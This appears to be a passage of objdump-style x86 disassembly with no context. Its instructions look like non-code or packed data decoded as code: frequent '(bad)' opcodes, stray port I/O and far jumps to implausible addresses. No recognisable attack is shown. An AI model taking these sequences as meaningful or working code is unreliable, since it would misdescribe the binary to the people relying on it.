  41e0a2:	shl    DWORD PTR ds:[ebx+0x5c],1
  41e0a6:	push   esi
  41e0a7:	or     BYTE PTR [edx],bh
  41e0a9:	push   esp
  41e0aa:	(bad)  
  41e0ab:	fadd   DWORD PTR [eax-0xbdb1c0b]
  41e0b1:	fwait
  41e0b2:	rcr    dh,0x1b
  41e0b5:	fst    QWORD PTR [esi+0x2147b912]
  41e0bb:	test   DWORD PTR [esi+0x50],esp
  41e0be:	mov    bh,al
  41e0c0:	loope  0x41e100
  41e0c2:	out    0x14,al
  41e0c4:	mov    esi,0x32ff95f9
  41e0c9:	push   esi
  41e0ca:	sub    BYTE PTR [eax-0x6f],cl
  41e0cd:	or     BYTE PTR fs:[edx+ebx*4-0x1b9ae0a8],bh
  41e0d5:	lock dec eax
  41e0d7:	adc    dl,bh
  41e0d9:	add    ebp,DWORD PTR [eax+0x1ef53593]
  41e0df:	dec    ecx
  41e0e0:	jmp    0xe5b164d4
  41e0e5:	ds and al,0x96
  41e0e8:	dec    eax
  41e0e9:	mov    bh,0x6e
  41e0eb:	mov    edx,0xbe580ebc
  41e0f0:	adc    ecx,DWORD PTR [edx-0x3db364c7]
  41e0f6:	scas   eax,DWORD PTR es:[edi]
  41e0f7:	sbb    bl,BYTE PTR [ecx-0x2e]
  41e0fa:	lahf   
  41e0fb:	in     al,dx
  41e0fc:	xor    edi,ecx
  41e0fe:	jo     0x41e080
  41e100:	dec    esi
  41e101:	or     eax,0xecbe7658
  41e106:	stc    
  41e107:	mov    cl,0x67
  41e109:	and    cl,BYTE PTR [edx+0x420242af]
  41e10f:	cmp    DWORD PTR [ebp-0x3eb02066],0xf3df525a
  41e119:	les    edx,FWORD PTR [ebx+0x476c74c9]
  41e11f:	dec    ebx
  41e120:	pop    ss
  41e121:	jae    0x41e0b3
  41e123:	imul   ebp,DWORD PTR [esi-0x118c257b],0x3e76f9c2
  41e12d:	dec    edi
  41e12e:	imul   ecx,DWORD PTR [esi],0xffffff95
  41e131:	mov    eax,0x5529ca08
  41e136:	aaa    
  41e137:	cmp    al,0xeb
  41e139:	out    dx,eax
  41e13a:	mov    eax,0xff3e6010
  41e13f:	mov    edx,0x602058a8
  41e144:	loopne 0x41e0d1
  41e146:	push   ss
  41e147:	adc    ebx,ecx
  41e149:	loop   0x41e147
  41e14b:	mov    eax,ds:0x2edfe715
  41e151:	sahf   
  41e152:	dec    esi
  41e153:	inc    eax
  41e154:	loope  0x41e174
  41e156:	xchg   esi,eax
  41e157:	push   ds
  41e158:	or     eax,0xe06d962c
  41e15d:	mov    eax,0x5fc6ca51
  41e162:	(bad)  
  41e163:	les    ecx,FWORD PTR [esi+0x3d0ddd1d]
  41e169:	fld    DWORD PTR [ebx+0x9]
  41e16c:	icebp  
  41e16d:	xor    eax,DWORD PTR [edx+0x4c]
  41e170:	jno    0x41e12c
  41e172:	ret    
  41e173:	ret    0xae58
  41e176:	sahf   
  41e177:	pop    edi
  41e178:	mov    cl,cl
  41e17a:	mov    ah,0xde
  41e17c:	jbe    0x41e1cb
  41e17e:	xchg   edx,eax
  41e17f:	add    ch,BYTE PTR [edx+0x5b1e2f29]
  41e185:	add    ebp,0xffffffbb
  41e188:	test   DWORD PTR [esi],edi
  41e18a:	hlt    
  41e18b:	add    eax,DWORD PTR ss:[edi-0x6]
  41e18f:	shr    DWORD PTR [edi-0x50],cl
  41e192:	mov    ecx,0xac626924
  41e197:	stos   DWORD PTR es:[edi],eax
  41e198:	dec    eax
  41e199:	outs   dx,DWORD PTR ds:[esi]
  41e19a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e19b:	adc    edi,DWORD PTR [edx-0x28]
  41e19e:	dec    eax
  41e19f:	xor    edx,ebx
  41e1a1:	sub    DWORD PTR [ecx-0x37],0x6c
  41e1a5:	xchg   edi,eax
  41e1a6:	cmp    ebx,ecx
  41e1a8:	lds    ebx,FWORD PTR [ecx+ecx*8]
  41e1ab:	(bad)  
  41e1ac:	mov    eax,DWORD PTR [edx]
  41e1ae:	and    eax,0x62365e0e
  41e1b3:	ret    
  41e1b4:	or     DWORD PTR [ecx],ecx
  41e1b6:	inc    ebp
  41e1b7:	aaa    
  41e1b8:	and    al,0x21
  41e1ba:	add    edi,DWORD PTR [edx]
  41e1bc:	xor    bh,BYTE PTR [eax+0x72]
  41e1bf:	mov    esp,0xb0f85222
  41e1c4:	add    edi,ebp
  41e1c6:	sub    esp,DWORD PTR ds:0x8f622918
  41e1cc:	loopne 0x41e1ce
  41e1ce:	jnp    0x41e158
  41e1d0:	sbb    bh,ah
  41e1d2:	xor    DWORD PTR [edi-0x1591afc2],ebp
  41e1d8:	or     dl,BYTE PTR [ebx]
  41e1da:	and    ebp,esi
  41e1dc:	into   
  41e1dd:	and    eax,0x2e37f2fd
  41e1e2:	and    ch,BYTE PTR [ebp+0x274fb669]
  41e1e8:	imul   ebx,DWORD PTR [edx],0xffffffbb
  41e1eb:	mov    edx,0x913bb402
  41e1f0:	mov    ch,BYTE PTR [ebp-0x3c]
  41e1f3:	push   ebx
  41e1f4:	push   edi
  41e1f5:	cmp    al,0xbd
  41e1f7:	xor    BYTE PTR [esi-0x3bf7ccfe],al
  41e1fd:	push   0x9faab99a
  41e202:	add    bl,cl
  41e204:	mov    cl,dl
  41e206:	fwait
  41e207:	push   ss
  41e208:	push   es
  41e209:	jl     0x41e228
  41e20b:	xchg   esp,eax
  41e20c:	push   ss
  41e20d:	out    0x9,eax
  41e20f:	jne    0x41e243
  41e211:	sub    ebp,ecx
  41e213:	neg    ch
  41e215:	fs pop edx
  41e217:	scas   al,BYTE PTR es:[edi]
  41e218:	cmp    DWORD PTR [edi-0x4c],0x28
  41e21c:	pop    esp
  41e21d:	leave  
  41e21e:	stos   DWORD PTR es:[edi],eax
  41e21f:	imul   edx,DWORD PTR [eax],0xdbefafb
  41e225:	or     ah,BYTE PTR [ebp+eax*8+0x621c0963]
  41e22c:	pop    esp
  41e22d:	stos   BYTE PTR es:[edi],al
  41e22e:	or     eax,0xf4bfddb8
  41e233:	mov    ebx,0x67a9a068
  41e238:	fisub  WORD PTR [ecx+0xfd12e44]
  41e23e:	cmp    edi,ecx
  41e240:	cmp    edi,DWORD PTR [eax]
  41e242:	or     eax,0x7f47e52b
  41e247:	add    al,0xe8
  41e249:	jns    0x41e1d4
  41e24b:	mov    ch,0x11
  41e24d:	(bad)  
  41e24e:	push   eax
  41e24f:	push   ebp
  41e250:	lock jmp 0x41e266
  41e253:	cmp    dl,dh
  41e255:	in     eax,dx
  41e256:	dec    ebp
  41e257:	in     eax,dx
  41e258:	pop    eax
  41e259:	and    ebx,DWORD PTR [edx+ebp*2+0x2e]
  41e25d:	mov    dl,0x68
  41e25f:	cld    
  41e260:	xchg   esp,eax
  41e261:	mov    BYTE PTR [edi],0xf5
  41e264:	ja     0x41e2d5
  41e266:	and    eax,0x52acadcd
  41e26b:	cmp    dl,bl
  41e26d:	rcr    BYTE PTR [esi+0x2a],1
  41e270:	mov    esp,0x557aa461
  41e275:	push   esi
  41e276:	std    
  41e277:	cs cmp al,0x69
  41e27a:	(bad)  
  41e27b:	cdq    
  41e27c:	fldcw  WORD PTR [eax-0x2f]
  41e27f:	(bad)  
  41e280:	aas    
  41e281:	push   es
  41e282:	mov    al,ds:0xe7c1a857
  41e287:	aad    0x87
  41e289:	test   eax,0x24677cd1
  41e28e:	mov    ds:0xaaab3d64,eax
  41e293:	js     0x41e249
  41e295:	retf   
  41e296:	dec    esi
  41e297:	jne    0x41e28e
  41e299:	aas    
  41e29a:	xchg   edi,eax
  41e29b:	fcomp  DWORD PTR [ebp+0x4a]
  41e29e:	ins    BYTE PTR es:[edi],dx
  41e29f:	mov    al,BYTE PTR [ebx+0x49]
  41e2a2:	jno    0x41e2b4
  41e2a4:	aam    0x8e
  41e2a6:	push   es
  41e2a7:	std    
  41e2a8:	out    dx,al
  41e2a9:	test   ecx,ecx
  41e2ab:	and    BYTE PTR [ebx],ah
  41e2ad:	dec    ebx
  41e2ae:	jle    0x41e2d4
  41e2b0:	leave  
  41e2b1:	leave  
  41e2b2:	bound  esi,QWORD PTR [edi-0xb3ec2c0]
  41e2b8:	mov    DWORD PTR [edi-0x48ceefe8],ebp
  41e2be:	inc    ebp
  41e2bf:	das    
  41e2c0:	inc    edx
  41e2c1:	sbb    DWORD PTR [ecx+0x5c],esi
  41e2c4:	dec    ecx
  41e2c5:	mov    dh,0xa5
  41e2c7:	cwde   
  41e2c8:	mov    cs,WORD PTR [ebp+0x3cb89b19]
  41e2ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2cf:	xchg   edi,eax
  41e2d0:	outs   dx,DWORD PTR ds:[esi]
  41e2d1:	inc    ebp
  41e2d2:	dec    edx
  41e2d3:	test   eax,0xc77ca55
  41e2d8:	jns    0x41e2a9
  41e2da:	push   edi
  41e2db:	jo     0x41e274
  41e2dd:	cdq    
  41e2de:	push   edx
  41e2df:	dec    esi
  41e2e0:	test   eax,0x434b40f8
  41e2e5:	push   esp
  41e2e6:	adc    al,0xe8
  41e2e8:	dec    ebx
  41e2e9:	adc    DWORD PTR [esi+ebp*4+0x37],ebp
  41e2ed:	not    DWORD PTR [ebx-0xd70045e]
  41e2f3:	jae    0x41e30f
  41e2f5:	pop    ebx
  41e2f6:	push   esp
  41e2f7:	es push ss
  41e2f9:	loopne 0x41e2dd
  41e2fb:	dec    edi
  41e2fc:	shr    ch,0xa8
  41e2ff:	ss push esi
  41e301:	pushf  
  41e302:	and    al,ch
  41e304:	(bad)  
  41e305:	lods   eax,DWORD PTR ds:[esi]
  41e306:	sbb    al,0x2c
  41e308:	imul   eax,DWORD PTR [ebx+0x55797a84],0x190bb467
  41e312:	setg   BYTE PTR [ebp-0x2e]
  41e316:	or     bh,BYTE PTR [esi-0x5]
  41e319:	cmp    eax,0x2195dcfe
  41e31e:	mov    edi,ecx
  41e320:	fnstsw WORD PTR [ebp+0x4c60ecd]
  41e326:	xchg   ebp,eax
  41e327:	dec    ebx
  41e328:	dec    edx
  41e329:	xor    BYTE PTR [edi],dl
  41e32b:	std    
  41e32c:	loopne 0x41e2fd
  41e32e:	add    al,0x3a
  41e330:	xor    DWORD PTR [edx+ebx*2-0x13],0x59df705a
  41e338:	fcmovb st,st(3)
  41e33a:	pusha  
  41e33b:	sbb    al,BYTE PTR [eax+0x76]
  41e33e:	xchg   esi,eax
  41e33f:	mov    bl,0xb2
  41e341:	pusha  
  41e342:	jne    0x41e325
  41e344:	mov    ds:0xd7a41275,al
  41e349:	aad    0xeb
  41e34b:	inc    esi
  41e34c:	push   0x8653cc39
  41e351:	and    BYTE PTR [ecx+0x5d],dh
  41e354:	daa    
  41e355:	jg     0x41e330
  41e357:	int    0x47
  41e359:	or     al,0x53
  41e35b:	jno    0x41e3a2
  41e35d:	mov    al,0x7c
  41e35f:	mov    ebp,DWORD PTR [ecx-0x79]
  41e362:	pop    esp
  41e363:	fldenv [eax+eiz*2]
  41e366:	mov    edi,esi
  41e368:	fisttp QWORD PTR [edx]
  41e36a:	ficomp WORD PTR [ebx+edi*8-0x7e62299e]
  41e371:	mov    esi,0x31bf325
  41e376:	stos   BYTE PTR es:[edi],al
  41e377:	or     eax,0x2ba71992
  41e37c:	push   esi
  41e37d:	(bad)  
  41e37e:	pop    esp
  41e37f:	mov    bl,0xbc
  41e381:	dec    esp
  41e382:	lods   al,BYTE PTR ds:[esi]
  41e383:	lea    eax,[esi]
  41e385:	and    BYTE PTR [ebx+0x5718908e],ah
  41e38b:	out    dx,eax
  41e38c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e38d:	in     eax,dx
  41e38e:	aas    
  41e38f:	adc    dl,dl
  41e391:	aaa    
  41e392:	xchg   edi,eax
  41e393:	mov    ebx,0x53d8851d
  41e398:	test   eax,0xeb369632
  41e39d:	test   eax,0x92aaba9f
  41e3a2:	repnz les esi,FWORD PTR [ebx+0x7c8ebdc3]
  41e3a9:	ss pop es
  41e3ab:	or     eax,0x26cdec16
  41e3b0:	leave  
  41e3b1:	shl    BYTE PTR [edi-0x6a],cl
  41e3b4:	mov    al,ds:0x6720f5ac
  41e3b9:	enter  0xaf67,0x1a
  41e3bd:	xchg   ebx,eax
  41e3be:	repz out dx,eax
  41e3c0:	or     esi,eax
  41e3c2:	dec    ebp
  41e3c3:	mov    esp,cs
  41e3c5:	jecxz  0x41e43c
  41e3c7:	cmp    esi,DWORD PTR [eax+0x452486d1]
  41e3cd:	stos   DWORD PTR es:[edi],eax
  41e3ce:	mov    WORD PTR [edx+0x364df790],gs
  41e3d4:	pop    ebp
  41e3d5:	dec    esi
  41e3d6:	je     0x41e44f
  41e3d8:	jb     0x41e400
  41e3da:	sub    DWORD PTR [esi],edx
  41e3dc:	xchg   ebp,eax
  41e3dd:	rcl    ch,cl
  41e3df:	jle    0x41e3ff
  41e3e1:	(bad)  
  41e3e2:	mov    ebx,0xc99a6595
  41e3e7:	jb     0x41e37c
  41e3e9:	pop    edi
  41e3ea:	adc    eax,0x618da6ee
  41e3ef:	pop    eax
  41e3f0:	sbb    ecx,ecx
  41e3f2:	adc    cl,al
  41e3f4:	in     eax,0x24
  41e3f6:	je     0x41e3ba
  41e3f8:	out    0x52,eax
  41e3fa:	aam    0x66
  41e3fc:	pop    ds
  41e3fd:	mov    cl,0x98
  41e3ff:	inc    edi
  41e400:	sub    eax,0xa683813b
  41e405:	(bad)  [bp+si-0x2431]
  41e40a:	bound  ecx,QWORD PTR [edx-0x6c99df4a]
  41e410:	jnp    0x41e3c2
  41e412:	loop   0x41e3ce
  41e414:	pusha  
  41e415:	sub    BYTE PTR [ebx-0x3a45f86e],0xee
  41e41c:	pop    esp
  41e41d:	stos   DWORD PTR es:[edi],eax
  41e41e:	ret    0x26a6
  41e421:	xchg   ecx,eax
  41e422:	in     eax,dx
  41e423:	jecxz  0x41e497
  41e425:	and    al,0xbd
  41e427:	pop    ds
  41e428:	or     BYTE PTR [edx-0x4b],cl
  41e42b:	xor    DWORD PTR [edx+eiz*2-0x30],eax
  41e42f:	cmp    esp,ebx
  41e431:	sbb    bh,ah
  41e433:	arpl   dx,cx
  41e435:	jne    0x41e3ea
  41e437:	cmp    dl,BYTE PTR [ecx+0x57]
  41e43a:	fisttp DWORD PTR [edx+0x53]
  41e43d:	out    0x91,eax
  41e43f:	mov    esi,0x421e1445
  41e444:	loope  0x41e43e
  41e446:	mov    dl,BYTE PTR [eax]
  41e448:	leave  
  41e449:	fs repnz mov eax,0x545257c6
  41e450:	inc    esi
  41e451:	mov    edx,0x5e0ec660
  41e456:	sbb    ebx,DWORD PTR [edi+0x7d]
  41e459:	fstp   DWORD PTR [ebx+0x602878bd]
  41e45f:	lahf   
  41e460:	dec    esi
  41e461:	dec    ebx
  41e462:	das    
  41e463:	push   esi
  41e464:	cwde   
  41e465:	push   eax
  41e466:	inc    esp
  41e467:	cmp    al,0x8e
  41e469:	sbb    ch,BYTE PTR [edx+0x4b2201f9]
  41e46f:	aad    0xc8
  41e471:	das    
  41e472:	outs   dx,DWORD PTR ds:[esi]
  41e473:	sub    BYTE PTR [edi],cl
  41e475:	inc    eax
  41e476:	push   esi
  41e477:	repz inc ecx
  41e479:	mov    ecx,DWORD PTR [ecx-0x28]
  41e47c:	xor    al,0x15
  41e47e:	mov    dh,0x36
  41e480:	xchg   edx,eax
  41e481:	mov    ah,0x7f
  41e483:	enter  0xdb9a,0xe4
  41e487:	adc    DWORD PTR [esi+eax*8],0xa637d9ca
  41e48e:	xchg   edx,eax
  41e48f:	rcr    BYTE PTR [esi-0x1109bb3],0xb9
  41e496:	fstp   QWORD PTR [ebp-0x11]
  41e499:	xor    DWORD PTR [eax],edi
  41e49b:	mov    eax,ds:0x7669f055
  41e4a0:	dec    eax
  41e4a1:	mov    cl,0xec
  41e4a3:	outs   dx,BYTE PTR ds:[esi]
  41e4a4:	mov    ch,0x34
  41e4a6:	and    esi,ecx
  41e4a8:	or     eax,0x6e2fb867
  41e4ad:	adc    BYTE PTR [eiz*1+0x6fba79c0],cl
  41e4b4:	sub    bl,0xc7
  41e4b7:	dec    edi
  41e4b8:	icebp  
  41e4b9:	rcr    DWORD PTR [ebp-0x4481fe5e],cl
  41e4bf:	add    ebp,ebp
  41e4c1:	imul   edi,DWORD PTR [edi+edi*1],0x4c7a9a1b
  41e4c8:	stos   BYTE PTR es:[edi],al
  41e4c9:	adc    BYTE PTR [edi],0x44
  41e4cc:	(bad)
  41e4cf:	(bad)  
  41e4d0:	mov    al,ds:0xd7eb0b14
  41e4d5:	push   cs
  41e4d6:	add    al,0x49
  41e4d8:	ss dec ebx
  41e4da:	and    BYTE PTR [eax],ah
  41e4dc:	int    0xb2
  41e4de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4df:	mov    ecx,0xc38247a4
  41e4e4:	and    BYTE PTR [ecx],cl
  41e4e6:	fs rcr ebx,0x14
  41e4ea:	xchg   edi,eax
  41e4eb:	mov    DWORD PTR [edi-0x53],ecx
  41e4ee:	xchg   ebp,eax
  41e4ef:	mov    ds:0x31a54d44,al
  41e4f4:	xchg   esi,eax
  41e4f5:	jae    0x41e571
  41e4f7:	nop
  41e4f8:	aad    0x80
  41e4fa:	ret    
  41e4fb:	cli    
  41e4fc:	mov    ds:0x7b057ea4,al
  41e501:	mov    edi,0x4769a174
  41e506:	push   ecx
  41e507:	inc    ecx
  41e508:	push   ecx
  41e509:	pop    eax
  41e50a:	xlat   BYTE PTR ds:[ebx]
  41e50b:	add    DWORD PTR [esi+eiz*8+0x61a7c75],ebp
  41e512:	push   ebp
  41e513:	stos   BYTE PTR es:[edi],al
  41e514:	jmp    DWORD PTR [edx]
  41e516:	sub    BYTE PTR [ebx-0x7b],al
  41e519:	sbb    bl,cl
  41e51b:	add    al,0x7a
  41e51d:	pop    ecx
  41e51e:	or     bh,bh
  41e520:	es xchg ecx,eax
  41e522:	mov    edx,0xcbe915a3
  41e527:	cmp    al,0x97
  41e529:	clc    
  41e52a:	repz xchg ebp,eax
  41e52c:	dec    esi
  41e52d:	dec    ebp
  41e52e:	and    BYTE PTR [edx-0x1e],ah
  41e531:	adc    eax,0x877f005b
  41e536:	(bad)  
  41e537:	push   esi
  41e538:	fild   DWORD PTR [esi]
  41e53a:	(bad)  
  41e53b:	clc    
  41e53c:	sar    DWORD PTR [ecx-0x4e],cl
  41e53f:	pop    esp
  41e540:	leave  
  41e541:	xchg   esi,ebp
  41e543:	jno    0x41e517
  41e545:	mov    ah,cl
  41e547:	int    0x4a
  41e549:	add    DWORD PTR [eax-0xd],edi
  41e54c:	mov    ecx,0x293f07f6
  41e551:	enter  0xad83,0x4d
  41e555:	add    ebp,DWORD PTR [ebx-0x146caca4]
  41e55b:	aad    0xa5
  41e55d:	xor    BYTE PTR [eax*8-0x9a9f077],al
  41e564:	sub    BYTE PTR [esi],ch
  41e566:	in     al,0x58
  41e568:	and    edx,DWORD PTR [eax+esi*2]
  41e56b:	repz push edi
  41e56d:	pusha  
  41e56e:	jp     0x41e5de
  41e570:	adc    DWORD PTR [esi],edi
  41e572:	pushf  
  41e573:	sar    BYTE PTR [ebp+0x5f],1
  41e576:	mov    ch,ch
  41e578:	ja     0x41e560
  41e57a:	or     ebp,ebx
  41e57c:	push   ss
  41e57d:	test   eax,0xc93956b9
  41e582:	add    edx,DWORD PTR [eax-0x53be632c]
  41e588:	popa   
  41e589:	loop   0x41e5c1
  41e58b:	xlat   BYTE PTR ds:[ebx]
  41e58c:	mov    edi,0x5da272ec
  41e591:	les    ecx,FWORD PTR [ebp-0x1]
  41e594:	adc    dh,BYTE PTR ds:0x1cf7ab8
  41e59a:	es pop edx
  41e59c:	jle    0x41e581
  41e59e:	popf   
  41e59f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5a0:	push   edx
  41e5a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a2:	ja     0x41e539
  41e5a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5a5:	aam    0x9a
  41e5a7:	xor    BYTE PTR ds:0xe768c9f2,0x28
  41e5ae:	cld    
  41e5af:	out    dx,eax
  41e5b0:	imul   DWORD PTR [esi+ebx*1-0x608ad571]
  41e5b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5b8:	jno    0x41e581
  41e5ba:	mov    edi,0x6621e9a7
  41e5bf:	xor    cl,BYTE PTR [esi+ebx*8]
  41e5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5c3:	fidiv  DWORD PTR [edi+0x5551eb7e]
  41e5c9:	dec    edi
  41e5ca:	(bad)  
  41e5cb:	xor    ah,BYTE PTR [edx-0x18]
  41e5ce:	lods   al,BYTE PTR ds:[esi]
  41e5cf:	loopne 0x41e5c8
  41e5d1:	xchg   edi,eax
  41e5d2:	idiv   BYTE PTR [edi*2-0x4ca0c046]
  41e5d9:	aam    0xea
  41e5db:	sti    
  41e5dc:	sar    dh,cl
  41e5de:	and    cl,ah
  41e5e0:	jmp    0x3450:0x421dc065
  41e5e7:	jge    0x41e5e4
  41e5e9:	xchg   BYTE PTR [ecx],bh
  41e5eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5ec:	enter  0xd942,0x64
  41e5f0:	xor    eax,0xb2ae33f4
  41e5f5:	iret   
  41e5f6:	and    al,0x1d
  41e5f8:	mov    ch,BYTE PTR [eax+0x11b35281]
  41e5fe:	jno    0x41e66f
  41e600:	cld    
  41e601:	cmc    
  41e602:	mov    esi,0xa83f25d9
  41e607:	aam    0x35
  41e609:	mov    ebp,0xc2111e3f
  41e60e:	xchg   esp,eax
  41e60f:	xlat   BYTE PTR ds:[ebx]
  41e610:	and    al,0xf
  41e612:	(bad)  
  41e614:	pop    gs
  41e616:	jnp    0x41e65e
  41e618:	pop    ebp
  41e619:	pop    ebp
  41e61a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e61b:	sub    DWORD PTR [ebp+0x4b],edi
  41e61e:	inc    eax
  41e61f:	mov    ebx,0x106b1fa
  41e624:	stos   DWORD PTR es:[edi],eax
  41e625:	pusha  
  41e626:	cmp    al,0x21
  41e628:	cld    
  41e629:	adc    al,0x63
  41e62b:	popf   
  41e62c:	mov    ch,BYTE PTR [edx-0x6b]
  41e62f:	pop    edx
  41e630:	mov    ebx,DWORD PTR [edx]
  41e632:	pop    eax
  41e633:	push   0x33
  41e635:	ins    BYTE PTR es:[edi],dx
  41e636:	push   cs
  41e637:	scas   al,BYTE PTR es:[edi]
  41e638:	add    ebx,DWORD PTR [esi+0x2a]
  41e63b:	sbb    ebp,DWORD PTR [ecx+ecx*1+0x169a211d]
  41e642:	enter  0xd4fc,0x6d
  41e646:	mov    ebx,0x2f13bf6f
  41e64b:	stc    
  41e64c:	mov    ds:0x3c8cd879,eax
  41e651:	pop    edx
  41e652:	jp     0x41e672
  41e654:	pop    ebp
  41e655:	jno    0x41e697
  41e657:	ins    DWORD PTR es:[edi],dx
  41e658:	push   eax
  41e659:	jle    0x41e5ef
  41e65b:	jmp    0x3461f5e2
  41e660:	xchg   ecx,eax
  41e661:	(bad)  
  41e662:	pop    ebp
  41e663:	jae    0x41e5f3
  41e665:	add    esi,eax
  41e667:	das    
  41e668:	jle    0x41e680
  41e66a:	ss push esi
  41e66c:	(bad)  
  41e66d:	(bad)  [eax+0x68eec999]
  41e673:	or     DWORD PTR [edx],ebp
  41e675:	jae    0x41e6d9
  41e677:	mov    ds:0xee4c6353,al
  41e67c:	mov    ecx,eax
  41e67e:	cwde   
  41e67f:	dec    ebx
  41e680:	jno    0x41e6f2
  41e682:	aad    0x90
  41e684:	add    ebx,DWORD PTR [ecx+0x65]
  41e687:	inc    esp
  41e688:	mov    esi,0xc96c7674
  41e68d:	xchg   ecx,eax
  41e68e:	cmp    DWORD PTR [esi+0x2d5ab4d0],esi
  41e694:	sbb    BYTE PTR [ecx-0x421b3204],cl
  41e69a:	push   0xd
  41e69c:	push   0xffffffa0
  41e69e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e69f:	push   0x57
  41e6a1:	loop   0x41e662
  41e6a3:	add    al,0x2
  41e6a5:	sar    DWORD PTR [ebp+0x30],1
  41e6a8:	outs   dx,BYTE PTR ds:[esi]
  41e6a9:	loop   0x41e6c9
  41e6ab:	pop    ss
  41e6ac:	dec    ebx
  41e6ad:	adc    al,0x5b
  41e6af:	mov    ah,0x9d
  41e6b1:	jmp    0x41e66a
  41e6b3:	(bad)  
  41e6b4:	or     edi,ecx
  41e6b6:	out    0x84,eax
  41e6b8:	mov    bl,0xde
  41e6ba:	(bad)  
  41e6bb:	(bad)  
  41e6bd:	not    BYTE PTR [edx-0x71]
  41e6c0:	cmp    al,0xb2
  41e6c2:	xor    esi,DWORD PTR [ebp+ecx*8-0x33]
  41e6c6:	retf   0x8a5c
  41e6c9:	xor    DWORD PTR [ebp-0x1a],eax
  41e6cc:	dec    ebp
  41e6cd:	mov    ds:0x4cdb7368,eax
  41e6d2:	int    0x4b
  41e6d4:	push   edx
  41e6d5:	push   eax
  41e6d6:	retf   
  41e6d7:	cmp    BYTE PTR [ecx+eax*2+0x71249562],0x6c
  41e6df:	fmul   QWORD PTR [esi-0xbfbeee6]
  41e6e5:	daa    
  41e6e6:	lods   eax,DWORD PTR ds:[esi]
  41e6e7:	xor    BYTE PTR [edx-0x5ebb52e0],0x62
  41e6ee:	retf   0x2b71
  41e6f1:	and    eax,0x841d9539
  41e6f6:	cs aas 
  41e6f8:	mov    eax,0x9736451f
  41e6fd:	jmp    0x41e6db
  41e6ff:	xchg   edi,eax
  41e700:	sbb    dl,bh
  41e702:	lea    ebp,[eax]
  41e704:	shl    BYTE PTR [ebx+0x1adbcba3],0xaf
  41e70b:	sub    eax,0xe35d5d5e
  41e710:	mov    edx,0xc82fd6c1
  41e715:	fcom   DWORD PTR ds:0xf2db5d12
  41e71b:	add    eax,0x958f6415
  41e720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e721:	sub    bl,BYTE PTR [edi+0x3f03151d]
  41e727:	arpl   WORD PTR [eax],si
  41e729:	(bad)  
  41e72b:	adc    BYTE PTR [edx],cl
  41e72d:	mov    esi,0x162ef215
  41e732:	push   eax
  41e733:	jmp    0x8f2d:0x7b0484a3
  41e73a:	mov    dh,0x7e
  41e73c:	jmp    0x41e733
  41e73e:	jno    0x41e783
  41e740:	das    
  41e741:	pop    ebp
  41e742:	aaa    
  41e743:	rol    DWORD PTR [ebp+0x53],1
  41e746:	stc    
  41e747:	jecxz  0x41e70d
  41e749:	cmp    edx,ebp
  41e74b:	int    0x82
  41e74d:	dec    esi
  41e74e:	sub    eax,0x2a6cdada
  41e753:	and    eax,DWORD PTR [eax-0x69]
  41e756:	inc    esi
  41e757:	lds    ebx,FWORD PTR [edx+0x2a0514ce]
  41e75d:	lods   al,BYTE PTR ds:[esi]
  41e75e:	test   al,0xd5
  41e760:	pushf  
  41e761:	arpl   WORD PTR [eax+0x1c],bx
  41e764:	mov    edi,0xe7dd143c
  41e769:	xor    esp,DWORD PTR [edx]
  41e76b:	(bad)  
  41e76c:	lods   al,BYTE PTR ds:[esi]
  41e76d:	retf   0x638e
  41e770:	sub    DWORD PTR [edi],0x8edf3c28
  41e776:	lds    edi,FWORD PTR [edi]
  41e778:	dec    ecx
  41e779:	inc    edx
  41e77a:	inc    ebx
  41e77b:	push   DWORD PTR [eax-0xa2fb0fb]
  41e781:	test   BYTE PTR [eax],0xe4
  41e784:	enter  0xf1a8,0x7a
  41e788:	sbb    al,0xc7
  41e78a:	ret    
  41e78b:	das    
  41e78c:	fadd   st(5),st
  41e78e:	add    cl,bh
  41e790:	jecxz  0x41e7dc
  41e792:	je     0x400ebb6a
  41e798:	lods   al,BYTE PTR ds:[esi]
  41e799:	dec    eax
  41e79a:	aaa    
  41e79b:	jmp    DWORD PTR [ebx]
  41e79d:	sub    al,0x44
  41e79f:	xchg   BYTE PTR [edi],bh
  41e7a1:	lock and esi,edi
  41e7a4:	sbb    ebp,DWORD PTR [edx+edx*4-0x471fe90d]
  41e7ab:	popa   
  41e7ac:	sub    eax,0x96ea7a23
  41e7b1:	lea    ecx,ds:0x4da90395
  41e7b7:	ss out dx,eax
  41e7b9:	lods   eax,DWORD PTR ds:[esi]
  41e7ba:	(bad)  
  41e7bb:	imul   eax,ebx,0x352b6d4f
  41e7c1:	fsub   DWORD PTR [edx+edi*2]
  41e7c4:	pop    esi
  41e7c5:	das    
  41e7c6:	jbe    0x41e787
  41e7c8:	xchg   esi,eax
  41e7c9:	clc    
  41e7ca:	mov    ah,0xc1
  41e7cc:	sbb    bl,BYTE PTR [ebx+0x67dbb395]
  41e7d2:	fsubr  DWORD PTR [edi-0x2f481efb]
  41e7d8:	sahf   
  41e7d9:	sbb    BYTE PTR [eax-0x719855ff],bl
  41e7df:	icebp  
  41e7e0:	xchg   DWORD PTR [esi],edx
  41e7e2:	call   0x9cc2:0x9cfe212b
  41e7e9:	mov    ds:0xa612c839,eax
  41e7ee:	ror    BYTE PTR [eax-0x784385f6],1
  41e7f4:	iret   
  41e7f5:	dec    eax
  41e7f6:	and    ebp,DWORD PTR [edi-0x3818872e]
  41e7fc:	ror    DWORD PTR [esi+0x26],cl
  41e7ff:	mov    esi,edx
  41e801:	push   cs
  41e802:	fld    TBYTE PTR [eax]
  41e804:	push   ds
  41e805:	mov    ecx,0x148e3150
  41e80a:	out    0x48,eax
  41e80c:	outs   dx,BYTE PTR ds:[esi]
  41e80d:	jae    0x41e7a0
  41e80f:	sbb    eax,0x11dcffd4
  41e814:	push   esp
